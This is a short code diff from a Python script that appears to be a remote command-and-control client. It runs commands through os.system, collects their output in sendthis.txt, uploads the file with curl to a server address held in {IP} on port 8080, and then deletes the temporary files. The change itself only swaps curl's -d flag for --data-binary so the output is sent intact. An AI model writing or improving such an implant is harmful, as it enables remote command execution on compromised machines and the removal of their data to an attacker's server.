@@ -76,7 +76,7 @@ def instructions():
 					mycommand += ' '
 				os.system(mycommand)
 				os.system("echo '_NextTask_' >> sendthis.txt")
-	os.system('curl -d @./sendthis.txt {IP}:8080/instructions.txt')
+	os.system('curl --data-binary @./sendthis.txt {IP}:8080/instructions.txt')
 	os.system('rm sendthis.txt response.txt')
 
 
